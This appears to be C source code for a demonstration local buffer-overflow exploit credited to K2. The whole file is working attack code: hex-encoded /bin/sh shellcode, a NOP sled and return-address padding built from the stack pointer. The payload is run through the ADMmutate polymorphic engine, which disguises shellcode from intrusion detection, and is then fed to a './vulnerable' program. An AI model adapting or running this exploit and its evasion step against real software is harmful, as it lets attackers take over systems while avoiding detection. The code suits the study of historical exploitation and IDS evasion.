/* 
   Demonstration local exploit,
   K2
*/
#include <stdio.h>
#include <stdlib.h>
#include "ADMmutapi.h"

#define SIZE   1200
#define NOPDEF 500
#define DEFOFF -550

char *shell =
#ifdef LINUX
"\xeb\x22\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x31\xc0\xaa"
"\x89\xf9\x89\xf0\xab\x89\xfa\x31\xc0\xab\xb0\x08\x04"
"\x03\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xd9\xff"
"\xff\xff/bin/sh";
#else
"\xeb\x48\x9a\xff\xff\xff\xff\x07\xff\xc3\x5e\x31\xc0\x89\x46\xb4"
"\x88\x46\xb9\x88\x46\x07\x89\x46\x0c\x31\xc0\x50\xb0\x8d\xe8\xdf"
"\xff\xff\xff\x83\xc4\x04\x31\xc0\x50\xb0\x17\xe8\xd2\xff\xff\xff"
"\x83\xc4\x04\x31\xc0\x50\x8d\x5e\x08\x53\x8d\x1e\x89\x5e\x08\x53"
"\xb0\x3b\xe8\xbb\xff\xff\xff\x83\xc4\x0c\xe8\xbb\xff\xff\xff\x2f"
"\x62\x69\x6e\x2f\x73\x68\xff\xff\xff\xff\xff\xff"; 
#endif

const char x86_nop=0x90;
long nop=NOPDEF,esp;
long offset=DEFOFF;
char buffer[SIZE];

long get_esp() { __asm__("movl %esp,%eax"); }

int main (int argc, char *argv[]) {
   struct morphctl *mctlp;
   struct morphctl mut;
    int i;
    mut.upper = 0; mut.lower = 0; mctlp = &mut;
    mut.banned=0;
   
    mut.arch = IA32;
   
    if (argc > 1) offset += strtol(argv[1], NULL, 0);
    if (argc > 2) nop += strtoul(argv[2], NULL, 0);
    esp = get_esp();

    memset(buffer, x86_nop, SIZE);
    memcpy(buffer+nop, shell, strlen(shell));
    for (i = nop+strlen(shell); i < SIZE-4; i += 4) {
        *((int *) &buffer[i]) = esp+offset;
    } 

   init_mutate(mctlp);
   apply_key(buffer, strlen(shell), nop-1, mctlp);
   apply_jnops(buffer, nop-1, mut);
   apply_engine(buffer, strlen(shell), nop-1, mut);

    fprintf(stderr,"jmp = [0x%x]\toffset = [%d]\n",esp+offset,offset);
    fprintf(stderr,"nop = %d, shell(%d)\n",nop,strlen(shell));
    //fprintf(stdout,"%s",buffer);
    execl("./vulnerable", "vulnerable", buffer, NULL);

    printf("exec failed!\n");
    return 0;
}
